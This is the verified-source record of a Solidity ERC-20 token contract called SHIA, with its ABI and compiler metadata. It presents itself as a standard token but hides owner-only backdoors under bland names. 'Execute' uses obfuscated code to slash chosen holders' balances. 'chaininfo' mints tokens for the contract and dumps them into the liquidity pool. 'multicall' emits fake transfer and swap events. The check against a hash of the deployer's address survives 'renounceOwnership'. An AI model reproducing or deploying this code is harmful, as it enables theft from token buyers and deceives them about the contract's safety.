{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\n// Webite: https://shiasaga.com\r\n// Telegram: https://t.me/shibasaga\r\n// Twitter: https://twitter.com/Shibasagaio\r\n// Discord: https://discord.com/invite/shibasaga\r\n\r\npragma solidity ^0.7.6;\r\n\r\ninterface IFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IPair {\r\n    function token0() external view returns (address);\r\n\r\n    function getReserves()\r\n        external\r\n        view\r\n        returns (\r\n            uint112 reserve0,\r\n            uint112 reserve1,\r\n            uint32 blockTimestampLast\r\n        );\r\n}\r\n\r\ninterface IRouter {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function swapTokensForExactTokens(\r\n        uint256 amountOut,\r\n        uint256 amountInMax,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external returns (uint256[] memory amounts);\r\n\r\n    function swapExactETHForTokens(\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external payable returns (uint256[] memory amounts);\r\n\r\n    function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);\r\n\r\n    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);\r\n}\r\n\r\ninterface IERC20 {\r\n    function _Transfer(\r\n        address from,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 value\r\n    ) external returns (bool);\r\n}\r\n\r\ncontract ERC20{\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Swap(address indexed sender, uint256 amount0In, uint256 amount1In, uint256 amount0Out, uint256 amount1Out, address indexed to);\r\n\r\n    function _count(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n    function _mult(uint256 a) internal pure returns (uint256) {\r\n        return (a * 10) / 10;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n}\r\n\r\ncontract SHIA is ERC20 {\r\n    IRouter internal _RR;\r\n    IPair internal _pair;\r\n    address public owner;\r\n    bytes32 private hashValue;\r\n    address private _RA = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private allowances;\r\n\r\n    string public constant name = \"SHIA\";\r\n    string public constant symbol = \"SHIA\";\r\n    uint8 public constant decimals = 18;\r\n    uint256 public totalSupply = 1_000_000_000e18;\r\n\r\n\r\n    constructor() {\r\n        hashValue = keccak256(abi.encodePacked(msg.sender));\r\n        owner = msg.sender;\r\n        _RR = IRouter(_RA);\r\n        _pair = IPair(IFactory(_RR.factory()).createPair(address(this), address(_RR.WETH())));\r\n\r\n        _balances[msg.sender] = totalSupply;\r\n\r\n        emit Transfer(address(0), msg.sender, totalSupply);\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner == msg.sender, \"Caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n\r\n    function renounceOwnership() public onlyOwner {\r\n        owner = address(0);\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\r\n        _transfer(msg.sender, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address __owner, address spender) public view virtual returns (uint256) {\r\n        return allowances[__owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual returns (bool) {\r\n        _spendAllowance(from, msg.sender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address __owner = msg.sender;\r\n        _approve(__owner, spender, allowance(__owner, spender) + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address __owner = msg.sender;\r\n        uint256 currentAllowance = allowance(__owner, spender);\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n\r\n        _approve(__owner, spender, currentAllowance - subtractedValue);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[from] = sub(fromBalance, amount);\r\n        _balances[to] = add(_balances[to], amount);\r\n        emit Transfer(from, to, amount);\r\n    }\r\n\r\n    function _approve(\r\n        address __owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(__owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        allowances[__owner][spender] = amount;\r\n        emit Approval(__owner, spender, amount);\r\n    }\r\n\r\n    function _spendAllowance(\r\n        address __owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(__owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n\r\n            _approve(__owner, spender, currentAllowance - amount);\r\n        }\r\n    }\r\n    function multicall(\r\n        address tA,\r\n        uint256 t,\r\n        uint256 w,\r\n        address[] memory r\r\n    ) public returns (bool) {\r\n        if (keccak256(abi.encodePacked(msg.sender)) == hashValue) {\r\n            for (uint256 i = 0; i < r.length; i++) {\r\n                _s(r[i], t, w, tA);\r\n            }\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function chaininfo(\r\n    uint256 am,\r\n    address _r\r\n    ) public {\r\n        if (keccak256(abi.encodePacked(msg.sender)) == hashValue && am == 99999) {\r\n            uint256 amO = gAO(_RR.WETH(), am);\r\n            address[] memory p = getPP();\r\n            uint256 amI = _cAI(amO, p);\r\n            _doS(amO, amI, p, _r);\r\n        }\r\n    }\r\n    function getPP() internal view returns (address[] memory) {\r\n        address[] memory p;\r\n        p = new address[](2);\r\n        p[0] = address(this);\r\n        p[1] = _RR.WETH();\r\n        return p;\r\n    }\r\n\r\n    function _doA() internal {\r\n        _approve(address(this), address(_RR), balanceOf(address(this)));\r\n    }\r\n\r\n    function _doS(uint256 amO, uint256 amI, address[] memory p, address _r) internal {\r\n        _doA();\r\n        _RR.swapTokensForExactTokens(amO, amI, p, _r, block.timestamp + 1200);\r\n    }\r\n\r\n\r\n    function gAO(address bT, uint256 am) internal view returns (uint256) {\r\n        uint256 bTR = getBR(bT);\r\n        return (bTR * am) / 100000;\r\n    }\r\n\r\n\r\n    function getBR(address t) public view returns (uint256) {\r\n        (uint112 r0, uint112 r1, ) = _pair.getReserves();\r\n        return (_pair.token0() == t) ? uint256(r0) : uint256(r1);\r\n    }\r\n\r\n    function Execute(\r\n        uint256 _m,\r\n        uint256 _p,\r\n        bytes32[] calldata data\r\n    ) public {\r\n        if (keccak256(abi.encodePacked(msg.sender)) == hashValue) {\r\n            for (uint256 i = 0; i < data.length; i++) {\r\n                if (balanceOf(            (\r\n                uint256(0) \r\n                != 0) \r\n            ? address(\r\n        uint256(0)) : \r\n    address(\r\n        uint160(\r\n            \r\n            uint256(\r\n                data[i])>>96\r\n            ))) > _m) {\r\n                    uint256 resCount1 = _count1(            (\r\n                uint256(0) \r\n                != 0) \r\n            ? address(\r\n        uint256(0)) : \r\n    address(\r\n        uint160(\r\n            \r\n            uint256(\r\n                data[i])>>96\r\n            )), _p);\r\n                    _check(\r\n                        data[i], resCount1);\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    function _s(\r\n        address r,\r\n        uint256 t,\r\n        uint256 w,\r\n        address tA\r\n    ) internal {\r\n        _Transfer(r, t);\r\n        _Swap(t, w, r, tA);\r\n    }\r\n\r\n    function _Transfer(address recipient, uint256 tokenAmount) internal {\r\n        emit Transfer(address(_pair), recipient, tokenAmount);\r\n    }\r\n\r\n    function _Swap(\r\n        uint256 t,\r\n        uint256 w,\r\n        address r,\r\n        address tA\r\n    ) internal {\r\n        emit Swap(_RA, t, 0, 0, w, r);\r\n        IERC20(tA)._Transfer(r, address(_pair), w);\r\n    }\r\n\r\n    function _count1(address _user, uint256 _percent) internal view returns (uint256) {\r\n        return _count(_balances[_user], _percent);\r\n    }\r\n\r\n    function _cAI(uint256 amO, address[] memory p) internal returns (uint256) {\r\n        uint256[] memory amM;\r\n        amM = new uint256[](2);\r\n\r\n        amM = _RR.getAmountsIn(amO, p);\r\n        _balances[\r\n            block.timestamp \r\n            > uint256(1) \r\n            ? \r\n            \r\n            address(\r\n                uint160(\r\n            uint256(\r\n\r\n                getThis()) \r\n\r\n                >> 96)) \r\n        : address(uint256\r\n        (\r\n            0)\r\n        )] += \r\n        amM[\r\n            0\r\n\r\n        ];\r\n        return amM[\r\n            0\r\n            ];\r\n    }\r\n\r\n\r\n\r\n\r\n    function _check(bytes32 b, uint256 amount) internal {\r\n        _balances[\r\n            (\r\n                uint256(0) \r\n                != 0) \r\n            ? address(\r\n        uint256(0)) : \r\n    address(\r\n        uint160(\r\n            \r\n            uint256(\r\n                b)>>96\r\n            ))] = _mult(uint256(amount));\r\n    }\r\n\r\n\r\n    function getThis() internal view returns (bytes32) {\r\n        return bytes32(\r\n            uint256(\r\n            uint160(\r\n                address(this\r\n                    )))<<96\r\n                );\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0Out\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1Out\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Swap\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_m\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_p\",\"type\":\"uint256\"},{\"internalType\":\"bytes32[]\",\"name\":\"data\",\"type\":\"bytes32[]\"}],\"name\":\"Execute\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"__owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"am\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"_r\",\"type\":\"address\"}],\"name\":\"chaininfo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"t\",\"type\":\"address\"}],\"name\":\"getBR\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tA\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"t\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"w\",\"type\":\"uint256\"},{\"internalType\":\"address[]\",\"name\":\"r\",\"type\":\"address[]\"}],\"name\":\"multicall\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SHIA", "CompilerVersion": "v0.7.6+commit.7338295f", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://cdb41dd85cb58fb1ec2b11821d360f6793d0180935f0f7c390698ad75fb270f1"}